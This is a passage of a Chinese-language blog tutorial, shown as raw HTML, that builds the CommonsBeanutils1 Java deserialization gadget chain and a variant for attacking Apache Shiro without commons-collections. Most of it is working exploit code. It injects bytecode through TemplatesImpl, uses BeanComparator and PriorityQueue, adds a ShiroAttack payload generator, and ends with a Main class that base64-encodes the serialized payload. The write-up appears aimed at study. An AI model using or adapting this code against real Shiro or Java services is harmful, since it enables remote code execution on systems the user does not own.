class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;IllegalAccessException: &quot;</span> + iae.toString() );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( InvocationTargetException ite ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;InvocationTargetException: &quot;</span> + ite.toString() );<br>    &#125;<br>    <span class="hljs-keyword">catch</span> ( NoSuchMethodException nsme ) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">RuntimeException</span>( <span class="hljs-string">&quot;NoSuchMethodException: &quot;</span> + nsme.toString() );<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个方法传入两个对象，如果 this.property 为空，则直接比较这两个对象；如果 this.property 不为空，则用 PropertyUtils.getProperty 分别取这两个对象的 this.property 属性，比较属性的值。</p><p> PropertyUtils.getProperty 这个方法会自动去调用一个JavaBean的getter方法，这个点是任意代码执行的关键。</p><p>在分析<code>TemplatesImpl</code>时，我们调用过<code>getOutputProperties()</code>,它是以get开头，符合getter的定义</p><p>下面是我们之前用到过的TemplatesImpl的调用链</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs java">TemplatesImpl#getOutputProperties() -&gt; TemplatesImpl#newTransformer() -&gt;<br>TemplatesImpl#getTransletInstance() -&gt;<br>TemplatesImpl#defineTransletClasses() -&gt;<br>TransletClassLoader#defineClass()<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">PropertyUtils.getProperty( o1, property )<br></code></pre></td></tr></table></figure><p>当o1为TemplatesImpl对象，而property值为outputProperties时，将会自动调用getter，即调用<code>getOutputProperties()</code>，触发代码执行</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> Object <span class="hljs-title function_">getProperty</span><span class="hljs-params">(Object bean, String name)</span><br>        <span class="hljs-keyword">throws</span> IllegalAccessException, InvocationTargetException,<br>        NoSuchMethodException &#123;<br><br>    <span class="hljs-keyword">return</span> (PropertyUtilsBean.getInstance().getProperty(bean, name));<br><br>&#125;<br></code></pre></td></tr></table></figure><h2 id="利用链构造"><a href="#利用链构造" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>所以我们的利用链是这样的</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs java">ObjectInputStream.readObject()<br>   PriorityQueue.readObject()<br>      ...<br>         TransformingComparator.compare()<br>            InvokerTransformer.transform()<br>               Method.invoke()<br>                  Runtime.exec()<br></code></pre></td></tr></table></figure><p>创建TemplateImpl</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>       setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>           ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>       &#125;);<br>       setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>       setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br></code></pre></td></tr></table></figure><p>当<code>BeanComparator</code>构造函数为空时，property为空</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">()</span> &#123;<br>    <span class="hljs-built_in">this</span>( <span class="hljs-literal">null</span> );<br>&#125;<br></code></pre></td></tr></table></figure><p>所以实例化<code>Comparator</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br></code></pre></td></tr></table></figure><p>用这个<code>obj</code>实例化<code>PriorityQueue</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br></code></pre></td></tr></table></figure><p>可见，我们添加了两个无害的可以比较的对象进队列中。前文说过， BeanComparator#compare() 中，如果 this.property 为空，则直接比较这两个对象。这里实际上就是对两个 1 进行排序。</p><p>初始化时使用正经对象，且 property 为空，这一系列操作是为了初始化的时候不要出错。然后，我们再用反射将 property 的值设置成恶意的 outputProperties ，将队列里的两个1替换成恶意的TemplateImpl 对象：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs java">setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br></code></pre></td></tr></table></figure><p>完整的利用链如下</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CommonsBeanutils1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj, String fieldName, Object</span><br><span class="hljs-params">        value)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;<br>            ClassPool.getDefault().get(evil.EvilTemplatesImpl.class.getName()).toBytecode()<br>        &#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>();<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-number">1</span>);<br>        queue.add(<span class="hljs-number">1</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        System.out.println(barr);<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span><br>            <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>奇怪的是这里的evil用不了</p><p>(先埋好坑，以后再来)</p><h1 id="无commons-collections的Shiro反序列化利用"><a href="#无commons-collections的Shiro反序列化利用" class="headerlink" title="无commons-collections的Shiro反序列化利用"></a>无commons-collections的Shiro反序列化利用</h1><p>先看<code>org.apache.commons.collections.comparators.ComparableComparator</code>在哪里使用了</p><p><img src="https://cdn.jsdelivr.net/gh/Decemberus/image/202303191238911.png" alt="image-20230224204318231"> </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-title function_">BeanComparator</span><span class="hljs-params">( String property )</span> &#123;<br>    <span class="hljs-built_in">this</span>( property, ComparableComparator.getInstance() );<br>&#125;<br></code></pre></td></tr></table></figure><p>在这个构造函数处，如果没有显式传入<code>Comparator</code>，就默认使用<code>ComparableComparator</code></p><blockquote><p>解释一下什么是显式传入</p><p>在构造函数中，如果调用者明确地传入了一个 Comparator 对象作为参数，就称为“显式传入 Comparator 对象”。例如，下面的代码中就显式地传入了一个自定义的 Comparator 对象，用于对字符串列表进行排序：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs java">List&lt;String&gt; stringList = Arrays.asList(<span class="hljs-string">&quot;foo&quot;</span>, <span class="hljs-string">&quot;bar&quot;</span>, <span class="hljs-string">&quot;baz&quot;</span>);<br>Collections.sort(stringList, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;() &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String s1, String s2)</span> &#123;<br>        <span class="hljs-keyword">return</span> s1.compareTo(s2);<br>    &#125;<br>&#125;);<br></code></pre></td></tr></table></figure><p>相反，如果在构造函数中没有传入 Comparator 对象，就需要使用默认的比较器来比较对象。</p><p>而ComparableComparator.getInstance() 就是默认的一个新的Comparator</p></blockquote><p>既然此时没有 ComparableComparator ，我们需要找到一个类来替换，它满足下面这几个条件：</p><ul><li><p>实现 java.util.Comparator 接口</p></li><li><p>实现 java.io.Serializable 接口</p></li><li><p>Java、shiro或commons-beanutils自带，且兼容性强</p></li></ul><p>通过IDEA的功能，我们找到一个 <code>CaseInsensitiveComparator</code> ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> Comparator&lt;String&gt; CASE_INSENSITIVE_ORDER<br>                                     = <span class="hljs-keyword">new</span> <span class="hljs-title class_">CaseInsensitiveComparator</span>();<br><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CaseInsensitiveComparator</span><br>        <span class="hljs-keyword">implements</span> <span class="hljs-title class_">Comparator</span>&lt;String&gt;, java.io.Serializable &#123;<br>    <span class="hljs-comment">// use serialVersionUID from JDK 1.2.2 for interoperability</span><br>    <span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">long</span> <span class="hljs-variable">serialVersionUID</span> <span class="hljs-operator">=</span> <span class="hljs-number">8575799808933029326L</span>;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">compare</span><span class="hljs-params">(String s1, String s2)</span> &#123;<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n1</span> <span class="hljs-operator">=</span> s1.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">n2</span> <span class="hljs-operator">=</span> s2.length();<br>        <span class="hljs-type">int</span> <span class="hljs-variable">min</span> <span class="hljs-operator">=</span> Math.min(n1, n2);<br>        <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; min; i++) &#123;<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c1</span> <span class="hljs-operator">=</span> s1.charAt(i);<br>            <span class="hljs-type">char</span> <span class="hljs-variable">c2</span> <span class="hljs-operator">=</span> s2.charAt(i);<br>            <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                c1 = Character.toUpperCase(c1);<br>                c2 = Character.toUpperCase(c2);<br>                <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                    c1 = Character.toLowerCase(c1);<br>                    c2 = Character.toLowerCase(c2);<br>                    <span class="hljs-keyword">if</span> (c1 != c2) &#123;<br>                        <span class="hljs-comment">// No overflow because of numeric promotion</span><br>                        <span class="hljs-keyword">return</span> c1 - c2;<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">return</span> n1 - n2;<br>    &#125;<br><br>    <span class="hljs-comment">/** Replaces the de-serialized object. */</span><br>    <span class="hljs-keyword">private</span> Object <span class="hljs-title function_">readResolve</span><span class="hljs-params">()</span> &#123; <span class="hljs-keyword">return</span> CASE_INSENSITIVE_ORDER; &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>这个 CaseInsensitiveComparator 类是 java.lang.String 类下的一个内部私有类，其实现了Comparator 和 Serializable ，且位于Java的核心代码中，兼容性强，是一个完美替代品。</p><p>我们通过 String.CASE_INSENSITIVE_ORDER 即可拿到上下文中的 CaseInsensitiveComparator 对象，用它来实例化 BeanComparator ：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,String.CASE_INSENSITIVE_ORDER);<br></code></pre></td></tr></table></figure><p>最后，构造出新的CommonsBeanutils1Shiro利用链：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;<br><span class="hljs-keyword">import</span> org.apache.commons.beanutils.BeanComparator;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.PriorityQueue;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ShiroAttack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setFieldValue</span><span class="hljs-params">(Object obj,String fieldName,Object value)</span><span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(fieldName);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj,value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-type">byte</span>[] getPayload(<span class="hljs-type">byte</span>[] clazzBytes) <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">obj</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TemplatesImpl</span>();<br>        setFieldValue(obj, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazzBytes&#125;);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;HelloTemplatesImpl&quot;</span>);<br>        setFieldValue(obj, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">TransformerFactoryImpl</span>());<br><br>        <span class="hljs-keyword">final</span> <span class="hljs-type">BeanComparator</span> <span class="hljs-variable">comparator</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanComparator</span>(<span class="hljs-literal">null</span>,<br>            String.CASE_INSENSITIVE_ORDER);<br>        <span class="hljs-keyword">final</span> PriorityQueue&lt;Object&gt; queue = <span class="hljs-keyword">new</span> <span class="hljs-title class_">PriorityQueue</span>&lt;Object&gt;(<span class="hljs-number">2</span>,<br>            comparator);<br><span class="hljs-comment">// stub data for replacement later</span><br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        queue.add(<span class="hljs-string">&quot;1&quot;</span>);<br>        setFieldValue(comparator, <span class="hljs-string">&quot;property&quot;</span>, <span class="hljs-string">&quot;outputProperties&quot;</span>);<br>        setFieldValue(queue, <span class="hljs-string">&quot;queue&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[]&#123;obj, obj&#125;);<br><span class="hljs-comment">// ==================</span><br><span class="hljs-comment">// 生成序列化字符串</span><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        oos.writeObject(queue);<br>        oos.close();<br>        <span class="hljs-keyword">return</span> barr.toByteArray();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>然后我写一个简单的利用程序</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">ShiroAttack</span> <span class="hljs-variable">attack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroAttack</span>();<br>        <span class="hljs-type">byte</span>[] clazzBytes= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">byte</span>[] payload = attack.getPayload(clazzBytes);<br>        System.out.println(payload);<br>    &#125;<br>&#125;<br><br><span class="hljs-comment">//输出为[B@77a567e1</span><br></code></pre></td></tr></table></figure><p>这个输出并不是预期的payload</p><p>这是因为<code>System.out.println(payload)</code> 打印的是字节数组的地址，而不是它的内容。</p><p>要正确地输出 payload 的内容，需要使用 <code>Base64</code> 编码将它转换为一个字符串</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> ysoserial.practice;<br><br><span class="hljs-keyword">import</span> java.util.Base64;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br><span class="hljs-comment">// source: bytecodes/HelloTemplateImpl.java</span><br>        <span class="hljs-type">ShiroAttack</span> <span class="hljs-variable">attack</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ShiroAttack</span>();<br>        <span class="hljs-type">byte</span>[] clazzBytes= Base64.getDecoder().decode(<span class="hljs-string">&quot;yv66vgAAADQAGwoABgANCQAOAA8IABAKABEAEgcAEwcAFAEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApTb3VyY2VGaWxlAQAKSGVsbG8uamF2YQwABwAIBwAVDAAWABcBAAtIZWxsbyBXb3JsZAcAGAwAGQAaAQAFSGVsbG8BABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABQAGAAAAAAABAAEABwAIAAEACQAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAoAAAAOAAMAAAACAAQABAAMAAUAAQALAAAAAgAM&quot;</span>);<br>        <span class="hljs-type">byte</span>[] payload = attack.getPayload(clazzBytes);<br>        <span class="hljs-type">String</span> <span class="hljs-variable">s</span> <span class="hljs-operator">=</span> Base64.getEncoder().encodeToString(payload);<br>        System.out.println(s);<br>    &#125;<br>&#125;<br><span 